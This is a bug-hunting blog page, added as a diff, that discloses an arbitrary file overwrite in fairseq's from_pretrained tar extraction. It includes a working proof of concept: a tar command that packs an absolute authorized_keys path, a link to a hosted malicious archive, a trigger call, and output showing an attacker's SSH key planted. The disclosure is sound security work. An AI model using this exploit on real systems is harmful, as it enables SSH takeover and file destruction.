@@ -1,0 +1,286 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>Arbitrary File Overwrite and Arbitrary Folder Delete in from_pretrained api | sunriseXu’s bug hunting journey</title>
+<meta name="generator" content="Jekyll v4.3.3" />
+<meta property="og:title" content="Arbitrary File Overwrite and Arbitrary Folder Delete in from_pretrained api" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Name" />
+<meta property="og:description" content="Name" />
+<link rel="canonical" href="http://localhost:4000/file-overwrite/2024/04/07/arbitrary-file-overwrite-in-facebook-fairseq.html" />
+<meta property="og:url" content="http://localhost:4000/file-overwrite/2024/04/07/arbitrary-file-overwrite-in-facebook-fairseq.html" />
+<meta property="og:site_name" content="sunriseXu’s bug hunting journey" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2024-04-07T10:31:06+08:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Arbitrary File Overwrite and Arbitrary Folder Delete in from_pretrained api" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2024-04-07T10:31:06+08:00","datePublished":"2024-04-07T10:31:06+08:00","description":"Name","headline":"Arbitrary File Overwrite and Arbitrary Folder Delete in from_pretrained api","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/file-overwrite/2024/04/07/arbitrary-file-overwrite-in-facebook-fairseq.html"},"url":"http://localhost:4000/file-overwrite/2024/04/07/arbitrary-file-overwrite-in-facebook-fairseq.html"}</script>
+<!-- End Jekyll SEO tag -->
+<link rel="stylesheet" href="/assets/main.css"><link type="application/atom+xml" rel="alternate" href="http://localhost:4000/feed.xml" title="sunriseXu&apos;s bug hunting journey" /></head>
+<body><header class="site-header" role="banner">
+
+  <div class="wrapper"><a class="site-title" rel="author" href="/">sunriseXu&#39;s bug hunting journey</a><nav class="site-nav">
+        <input type="checkbox" id="nav-trigger" class="nav-trigger" />
+        <label for="nav-trigger">
+          <span class="menu-icon">
+            <svg viewBox="0 0 18 15" width="18px" height="15px">
+              <path d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.032C17.335,0,18,0.665,18,1.484L18,1.484z M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.032C17.335,6.031,18,6.696,18,7.516L18,7.516z M18,13.516C18,14.335,17.335,15,16.516,15H1.484 C0.665,15,0,14.335,0,13.516l0,0c0-0.82,0.665-1.483,1.484-1.483h15.032C17.335,12.031,18,12.695,18,13.516L18,13.516z"/>
+            </svg>
+          </span>
+        </label>
+
+        <div class="trigger"><a class="page-link" href="/about/">About</a></div>
+      </nav></div>
+</header>
+<main class="page-content" aria-label="Content">
+      <div class="wrapper">
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+
+  <header class="post-header">
+    <h1 class="post-title p-name" itemprop="name headline">Arbitrary File Overwrite and Arbitrary Folder Delete in from_pretrained api</h1>
+    <p class="post-meta">
+      <time class="dt-published" datetime="2024-04-07T10:31:06+08:00" itemprop="datePublished">Apr 7, 2024
+      </time></p>
+  </header>
+
+  <div class="post-content e-content" itemprop="articleBody">
+    <h2 id="name">Name</h2>
+
+<blockquote>
+  <p>Arbitrary File Overwrite in from_pretrained api in facebook fairseq</p>
+</blockquote>
+
+<h2 id="weakness">Weakness</h2>
+
+<blockquote>
+  <p>CWE-22: Path Traversal</p>
+</blockquote>
+
+<h2 id="severity">Severity</h2>
+
+<blockquote>
+  <p>High (8.8)</p>
+</blockquote>
+
+<h2 id="description">Description</h2>
+
+<p>The <a href="https://fairseq.readthedocs.io/en/latest/models.html?highlight=from_pretrained#fairseq.models.BaseFairseqModel.from_pretrained">from_pretrained</a> function does not adequately prevent malicious tar files from performing path traversal attacks. This can allow the downloading of malicious tar files that can overwrite any file. This leads directly to a high impact regarding the integrity of files. An attacker could also abuse this to impact the availability, by deleting system files, personal files, or application files. Remote code execution is also possible through various means.</p>
+
+<p>The vulnerable function is exposed through the <a href="https://github.com/facebookresearch/fairseq/blob/bedb259bf34a9fc22073c13a1cee23192fa70ef3/fairseq/models/fairseq_model.py#L272">BaseFairseqModel.from_pretrained</a> function. It’s an api used to read pretrained from files on disk, S3 path, or URL which is tar file.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>def from_pretrained(
+        cls,
+        model_name_or_path,
+        checkpoint_file="model.pt",
+        data_name_or_path=".",
+        **kwargs,
+    ):
+        from fairseq import hub_utils
+
+        x = hub_utils.from_pretrained(
+            model_name_or_path,
+            checkpoint_file,
+            data_name_or_path,
+            archive_map=cls.hub_models(),
+            **kwargs,
+        )
+        logger.info(x["args"])
+        return hub_utils.GeneratorHubInterface(x["args"], x["task"], x["models"])
+</code></pre></div></div>
+
+<p>and then it calls <a href="https://github.com/facebookresearch/fairseq/blob/bedb259bf34a9fc22073c13a1cee23192fa70ef3/fairseq/hub_utils.py#L23">hub_utils.from_pretrained</a>, in this function, it calls <a href="https://github.com/facebookresearch/fairseq/blob/bedb259bf34a9fc22073c13a1cee23192fa70ef3/fairseq/file_utils.py#L54">file_utils.load_archive_file</a> to download file from <code class="language-plaintext highlighter-rouge">model_name_or_path</code></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>def from_pretrained(
+    model_name_or_path,
+    checkpoint_file="model.pt",
+    data_name_or_path=".",
+    archive_map=None,
+    **kwargs
+):
+    ...
+    model_path = file_utils.load_archive_file(model_name_or_path)
+</code></pre></div></div>
+
+<p>in <code class="language-plaintext highlighter-rouge">file_utils.load_archive_file</code>, it calls <code class="language-plaintext highlighter-rouge">file_utils.cached_path</code> firstly:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>def load_archive_file(archive_file):
+    # redirect to the cache, if necessary
+    try:
+        resolved_archive_file = cached_path(archive_file, cache_dir=None)
+    except EnvironmentError:
+        logger.info(
+            "Archive name '{}' was not found in archive name list. "
+            "We assumed '{}' was a path or URL but couldn't find any file "
+            "associated to this path or URL.".format(
+                archive_file,
+                archive_file,
+            )
+        )
+        return None
+
+    if resolved_archive_file == archive_file:
+        logger.info("loading archive file {}".format(archive_file))
+    else:
+        logger.info(
+            "loading archive file {} from cache at {}".format(
+                archive_file, resolved_archive_file
+            )
+        )
+
+    # Extract archive to temp dir and replace .tar.bz2 if necessary
+    tempdir = None
+    if not os.path.isdir(resolved_archive_file):
+        tempdir = tempfile.mkdtemp()
+        logger.info(
+            "extracting archive file {} to temp dir {}".format(
+                resolved_archive_file, tempdir
+            )
+        )
+        ext = os.path.splitext(archive_file)[1][1:]
+        with tarfile.open(resolved_archive_file, "r:" + ext) as archive:
+            top_dir = os.path.commonprefix(archive.getnames())
+            archive.extractall(tempdir)
+        os.remove(resolved_archive_file)
+        shutil.move(os.path.join(tempdir, top_dir), resolved_archive_file)
+        shutil.rmtree(tempdir)
+
+    return resolved_archive_file
+</code></pre></div></div>
+
+<p>and then in <code class="language-plaintext highlighter-rouge">file_utils.cached_path</code>, when parmeter <code class="language-plaintext highlighter-rouge">url_or_filename</code> is an url, it calls <a href="https://github.com/facebookresearch/fairseq/blob/bedb259bf34a9fc22073c13a1cee23192fa70ef3/fairseq/file_utils.py#L279">file_utils.get_from_cache</a> to download tar file and save file content in temperary file and return the temperary file path to <code class="language-plaintext highlighter-rouge">file_utils.load_archive_file</code>.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>def get_from_cache(url, cache_dir=None):
+    ...    
+    cache_path = os.path.join(cache_dir, filename)
+    if not os.path.exists(cache_path):
+        # Download to temporary file, then copy to cache dir once finished.
+        # Otherwise you get corrupt cache entries if the download gets interrupted.
+        with tempfile.NamedTemporaryFile() as temp_file:
+            logger.info("%s not found in cache, downloading to %s", url, temp_file.name)
+
+            # GET file object
+            if url.startswith("s3://"):
+                s3_get(url, temp_file)
+            else:
+                ##### Download tar file from url!!!!! #####
+                http_get(url, temp_file)
+
+            # we are copying the file before closing it, so flush to avoid truncation
+            temp_file.flush()
+            # shutil.copyfileobj() starts at the current position, so go to the start
+            temp_file.seek(0)
+    ...
+    return cache_path
+</code></pre></div></div>
+
+<p>Back to <code class="language-plaintext highlighter-rouge">file_utils.load_archive_file</code>, the malicious tar file is opened by <code class="language-plaintext highlighter-rouge">tarfile.open</code> and extracted by <code class="language-plaintext highlighter-rouge">archive.extractall</code> without any security checks which is well-known vulnerability. when tar file is compressed by <code class="language-plaintext highlighter-rouge">tar</code> option <code class="language-plaintext highlighter-rouge">--absolute-names</code>, absolute path names and relative path names can be included in tar file. When extracted by <code class="language-plaintext highlighter-rouge">tarfile.extractall</code>, the file with absolute names will overwrite target files silently, causing arbitrary file overwite.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>def load_archive_file(archive_file):
+    ...
+    # Extract archive to temp dir and replace .tar.bz2 if necessary
+    tempdir = None
+    if not os.path.isdir(resolved_archive_file):
+        tempdir = tempfile.mkdtemp()
+        logger.info(
+            "extracting archive file {} to temp dir {}".format(
+                resolved_archive_file, tempdir
+            )
+        )
+        ext = os.path.splitext(archive_file)[1][1:]
+        with tarfile.open(resolved_archive_file, "r:" + ext) as archive:
+            top_dir = os.path.commonprefix(archive.getnames())
+            archive.extractall(tempdir)
+        os.remove(resolved_archive_file)
+        shutil.move(os.path.join(tempdir, top_dir), resolved_archive_file)
+        shutil.rmtree(tempdir)
+
+    return resolved_archive_file
+</code></pre></div></div>
+
+<p>During the testing, I found the file to be overwrite is missing. By reading the source code carefully, it uses <code class="language-plaintext highlighter-rouge">shutil.move</code> to move files extracted to <code class="language-plaintext highlighter-rouge">resolved_archive_file</code> target. The move source is from <code class="language-plaintext highlighter-rouge">os.path.join(tempdir, top_dir)</code> and <code class="language-plaintext highlighter-rouge">top_dir</code> is from <code class="language-plaintext highlighter-rouge">os.path.commonprefix(archive.getnames())</code>. Well, this is controlled by attacker, in <a href="https://docs.python.org/3/library/os.path.html#os.path.commonprefix">Python documents</a>, when list contains both abs and relative pathnames, it will return empty string in which attacker can include abs and relative names in tar file, and then <code class="language-plaintext highlighter-rouge">move</code> source will be <code class="language-plaintext highlighter-rouge">tempdir</code> which bypass the <code class="language-plaintext highlighter-rouge">shutil.move</code>.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&gt; os.path.commonprefix(['/home/kali/.ssh/xx', '404.html'])
+  ''
+&gt; os.path.join("/root/tmp/","")
+  '/root/tmp/'
+</code></pre></div></div>
+
+<h2 id="proof-of-concept">Proof of Concept</h2>
+
+<p>An attacker can create a malicous tar file using following command:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>tar --absolute-names -cvf hack.tar /home/kali/.ssh/authorized_keys 404.html
+</code></pre></div></div>
+
+<p>Then, the attacker will upload the <code class="language-plaintext highlighter-rouge">hack.tar</code> to public server.</p>
+
+<p>I have uploaded one malicous tar file for testing: <a href="https://raw.githubusercontent.com/sunriseXu/onnx/main/validated/hack-abs-and-relative.tar">https://raw.githubusercontent.com/sunriseXu/onnx/main/validated/hack-abs-and-relative.tar</a></p>
+
+<p>If anyone now downloads tar using <code class="language-plaintext highlighter-rouge">from_pretrained</code> api, causing automatically extracting the malicous tar file and overwrite files silently.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>from fairseq.models.transformer import TransformerModel
+model = TransformerModel.from_pretrained('https://raw.githubusercontent.com/sunriseXu/onnx/main/validated/hack-abs-and-relative.tar')
+</code></pre></div></div>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&gt; cat /home/kali/.ssh/authorized_keys
+ssh-rsa xxx hacker@test.com
+</code></pre></div></div>
+
+<p>Tested on Google Colab: <a href="https://colab.research.google.com/drive/1AY9iqw_FdTvMGoqaDseX8jCnSGV9qCq6?usp=sharing">https://colab.research.google.com/drive/1AY9iqw_FdTvMGoqaDseX8jCnSGV9qCq6?usp=sharing</a></p>
+
+<p><img src="https://live.staticflickr.com/65535/53639482085_b57cae8712_k.jpg" alt="poc" /></p>
+
+<h2 id="impact">Impact</h2>
+
+<p>This vulnerability can have severe consequences. This section will highlight some tangible impact.</p>
+
+<h3 id="ssh-access">SSH Access</h3>
+
+<p>On servers that have SSH enabled, an attacker may be able to inject their own public RSA key into the authorized_keys file, leading to remote code execution.</p>
+
+<h3 id="web-servers">Web Servers</h3>
+
+<p>On servers hosting web servers, various vulnerabilities can be exploited. On PHP or JSP server, remote code execution may be possible via uploading a webshell. On other servers an HTML file can be uploaded to achieve Cross-site Scripting (XSS)</p>
+
+<h2 id="reference">Reference</h2>
+
+<p><a href="https://huntr.com/bounties/5d7e5752-085c-4e93-af0d-e25f05a27b89">https://huntr.com/bounties/5d7e5752-085c-4e93-af0d-e25f05a27b89</a></p>
+
+<h2 id="occurrences">Occurrences</h2>
+
+<p><a href="https://github.com/facebookresearch/fairseq/blob/bedb259bf34a9fc22073c13a1cee23192fa70ef3/fairseq/file_utils.py#L90">https://github.com/facebookresearch/fairseq/blob/bedb259bf34a9fc22073c13a1cee23192fa70ef3/fairseq/file_utils.py#L90</a></p>
+
+  </div><a class="u-url" href="/file-overwrite/2024/04/07/arbitrary-file-overwrite-in-facebook-fairseq.html" hidden></a>
+</article>
+
+      </div>
+    </main><footer class="site-footer h-card">
+  <data class="u-url" href="/"></data>
+
+  <div class="wrapper">
+
+    <h2 class="footer-heading">sunriseXu&#39;s bug hunting journey</h2>
+
+    <div class="footer-col-wrapper">
+      <div class="footer-col footer-col-1">
+        <ul class="contact-list">
+          <li class="p-name">sunriseXu&#39;s bug hunting journey</li><li><a class="u-email" href="mailto:github@example.com">github@example.com</a></li></ul>
+      </div>
+
+      <div class="footer-col footer-col-2"><ul class="social-media-list"><li><a href="https://github.com/jekyll"><svg class="svg-icon"><use xlink:href="/assets/minima-social-icons.svg#github"></use></svg> <span class="username">jekyll</span></a></li><li><a href="https://www.twitter.com/jekyllrb"><svg class="svg-icon"><use xlink:href="/assets/minima-social-icons.svg#twitter"></use></svg> <span class="username">jekyllrb</span></a></li></ul>
+</div>
+
+      <div class="footer-col footer-col-3">
+        <p>sunriseXu&#39;s bug hunting journey, sharing new findings of bug hunting.</p>
+      </div>
+    </div>
+
+  </div>
+
+</footer>
+</body>
+
+</html>
